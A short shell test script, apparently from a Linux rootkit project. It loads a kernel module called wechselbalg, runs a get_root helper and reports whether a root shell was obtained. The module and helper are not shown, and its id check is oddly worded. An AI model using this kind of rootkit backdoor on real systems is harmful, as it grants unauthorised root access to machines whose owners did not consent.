#!/bin/sh

error=0
gpid=-1

# id shouln't be 0
if [ ! $(id -u) != "0" ]; then
	echo "error: id -g returned 0, you're already root"
	error=1
fi

sudo insmod ../bin/wechselbalg.ko

echo "exit" > exit.file
../get_root/get_root < exit.file

if [ $? -ne 0 ]; then
	echo "error: get_root failed"
	error=1
fi

rm exit.file

sudo rmmod wechselbalg

if [ "$error" -eq 1 ]; then
	echo "[root shell] failed"
else 
	echo "[root shell] successfull"
fi
